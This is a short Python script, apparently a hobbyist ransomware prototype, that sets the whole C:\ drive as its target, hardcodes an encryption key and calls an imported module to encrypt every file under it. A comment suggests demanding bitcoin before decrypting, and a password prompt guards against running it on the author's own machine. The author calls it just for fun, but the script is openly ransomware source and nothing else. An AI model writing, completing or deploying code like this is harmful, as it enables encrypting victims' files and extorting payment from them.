#just to add this is just a bit of fun, i would not consider using this.
import encryptionManager
import random
import time



rootDirectionary = 'C:\\'#everything in this directory will be encrypted
key = "0c92c4e1a35551ed366ca52bf12b6037"  #str(random.getrandbits(32)) < this doesnt work
#I cant find a way to generate a 16 byte key, in python. So im using this for now



password = raw_input("Oh god dont do this accidentally, whats the password: ")  #@UndefinedVariable this is here to make sure that 
#I dont accidently start this on my own computer

if password != "basil":
    exit()


filesChanged = encryptionManager.manage(0, rootDirectionary, key)#encrypts the files
             
        
"""
You can put anything you want here. For example you could create a bitcoin wallet with an API,
and decrypt the files once an amount of bitcoins has been transfered to it. 

"""

encryptionManager.manage(1, rootDirectionary, key)#decypts the files.
exit()        
        
        